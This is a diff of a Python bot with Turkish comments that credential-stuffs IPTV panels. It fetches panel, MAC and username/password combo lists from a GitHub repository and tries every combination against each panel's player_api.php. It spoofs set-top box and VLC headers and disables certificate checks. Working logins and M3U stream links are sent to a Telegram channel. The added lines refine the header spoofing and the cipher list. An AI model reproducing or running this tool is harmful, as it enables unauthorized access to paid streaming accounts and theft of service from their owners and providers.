@@ -5,7 +5,8 @@ import requests
 from flask import Flask
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-# SSL uyarılarını kapat
+# SSL ve Cipher yapılandırması (Güçlendirilmiş bağlantı)
+requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 app = Flask('')
@@ -29,14 +30,19 @@ def telegrama_gonder(mesaj):
     except Exception as e:
         print(f"[!] Telegram mesajı gönderilemedi: {e}")
 
+HEADERd = {
+    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
+    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
+    'Accept': '*/*',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
+}
+
 def m3u_tara(panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
-    headers = {
-        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
-        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
-    }
     try:
-        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
+        res = requests.get(api_url, headers=HEADERd, timeout=5, verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             if '"auth":1' in res.text or '"status":"Active"' in res.text:
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
@@ -72,8 +78,8 @@ def mac_tara(panel, mac):
 
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Tarayıcı Başlatıldı ve GitHub Verileri Bekleniyor...")
+    telegrama_gonder("🚀 <b>IPTV Botu başarıyla başlatıldı, tarama turları dönüyor!</b>")
     
-    # GitHub Raw Yolları
     MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/mac_list/MAC.txt"
     PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/panel_list/benzersiz_paneller.txt"
     COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass.txt"
@@ -82,7 +88,6 @@ def arka_plan_tarayici():
         try:
             print("[i] GitHub'dan güncel veriler çekiliyor...")
             
-            # 1. MAC Listesini Çek
             maclar = []
             try:
                 r_mac = requests.get(MAC_RAW_URL, timeout=10)
@@ -92,7 +97,6 @@ def arka_plan_tarayici():
             except Exception as e:
                 print(f"[!] MAC'ler çekilemedi: {e}")
 
-            # 2. Panelleri Çek
             paneller = []
             try:
                 r_panel = requests.get(PANEL_RAW_URL, timeout=10)
@@ -102,7 +106,6 @@ def arka_plan_tarayici():
             except Exception as e:
                 print(f"[!] Paneller çekilemedi: {e}")
 
-            # 3. Combo (User/Pass) Listesini Çek
             combolar = []
             try:
                 r_combo = requests.get(COMBO_RAW_URL, timeout=10)
@@ -121,7 +124,6 @@ def arka_plan_tarayici():
                 time.sleep(300)
                 continue
 
-            # Önce MAC Taramaları
             if maclar and paneller:
                 print("[i] MAC taraması başlatılıyor...")
                 for panel in paneller:
@@ -129,7 +131,6 @@ def arka_plan_tarayici():
                         mac_tara(panel, mac)
                         time.sleep(0.3)
 
-            # Sonra Combo (M3U) Taramaları
             if combolar and paneller:
                 print("[i] M3U (User/Pass) taraması başlatılıyor...")
                 for panel in paneller:
